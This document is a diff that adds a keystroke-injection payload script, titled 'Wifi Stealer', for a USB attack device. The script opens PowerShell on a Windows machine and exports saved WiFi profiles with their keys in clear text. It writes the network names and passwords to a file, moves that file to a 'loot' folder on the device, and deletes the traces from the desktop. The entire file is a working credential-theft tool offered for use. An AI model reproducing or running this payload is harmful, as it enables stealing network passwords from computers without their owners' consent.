@@ -1,0 +1,45 @@
+REM Title: Wifi Stealer
+REM Author: elementalSec
+REM Target: Tested on Windows 11 
+REM Version: 1.0
+REM Category: Grabber
+REM Extracts the SSID and wifi shared key and puts them in a txt file named 0.txt on the desktop
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+REM Run netsh to get WiFi credentials
+LED STAGE1
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell 
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING "cd \$env:USERPROFILE/Desktop; netsh wlan export profile key=clear; Get-Content "WiFi-*.xml" | Select-String -Pattern 'keyMaterial' | ForEach-Object { $_ -replace '<\/?keyMaterial>', '' -replace '.xml:22:', '' } | Out-File "0.txt"; Remove-Item "WiFi-*.xml""
+QUACK ENTER
+
+REM Create a WiFi directory in D:\loot, then move those XML files into it
+LED STAGE2
+QUACK DELAY 500
+QUACK STRING mkdir D:/loot/WiFi
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING mv \$env:USERPROFILE/Desktop/*.xml D:/loot/WiFi
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING mv \$env:USERPROFILE/Desktop/0.txt D:/loot/WiFi
+QUACK ENTER
+
+QUACK DELAY 500
+QUACK STRING rm \$env:USERPROFILE/Desktop/*.xml
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING rm \$env:USERPROFILE/Desktop/0.txt
+QUACK ENTER
+
+REM exit PowerShell and finish running
+QUACK DELAY 500
+QUACK STRING exit
+QUACK ENTER
+
+LED FINISH
